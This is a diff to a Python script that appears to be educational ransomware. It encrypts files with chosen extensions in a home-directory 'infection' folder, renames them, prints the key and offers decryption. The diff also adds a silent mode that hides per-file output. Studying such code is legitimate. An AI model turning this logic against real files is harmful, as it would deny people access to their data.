@@ -13,11 +13,11 @@ def parse_arguments():
 
 
 def gen_key():
-    return Fernet.generate_key().decode('utf-8')
+    return Fernet.generate_key()
 
 
 def crypt(file_path, key):
-    cipher_suite = Fernet(key.encode('utf-8'))
+    cipher_suite = Fernet(key)
     with open(file_path, 'rb') as file_to_encrypt:
         file_contents = file_to_encrypt.read()
     encrypted_contents = cipher_suite.encrypt(file_contents)
@@ -26,7 +26,7 @@ def crypt(file_path, key):
 
 
 def decrypt(file_path, key):
-    cipher_suite = Fernet(key.encode('utf-8'))
+    cipher_suite = Fernet(key)
     with open(file_path, 'rb') as file_to_decrypt:
         encrypted_contents = file_to_decrypt.read()
     decrypted_contents = cipher_suite.decrypt(encrypted_contents)
@@ -64,7 +64,9 @@ def main():
                 for file in files:
                     filepath = os.path.join(root, file)
                     decrypt(filepath, key)
-                    print(f"{filepath} decrypted")
+                    if not args.silent:
+                        print(f"{filepath} decrypted")
+            print("Decryption done")
     else:
         target = os.path.join(os.environ['HOME'], 'infection')
         if not os.path.isdir(target):
@@ -72,14 +74,15 @@ def main():
             sys.exit(1)
 
         key = gen_key()
-        print(f"Key: {key}")
+        print(f"Key: {key.decode()}")
         for root, dirs, files in os.walk(target):
             for file in files:
                 _, ext = os.path.splitext(file)
                 if ext in targeted_extensions:
                     filepath = os.path.join(root, file)
                     crypt(filepath, key)
-                    print(f"{file} crypted")
+                    if not args.silent:
+                        print(f"{file} crypted")
                     rename(filepath)
         print("Encryption done")
 
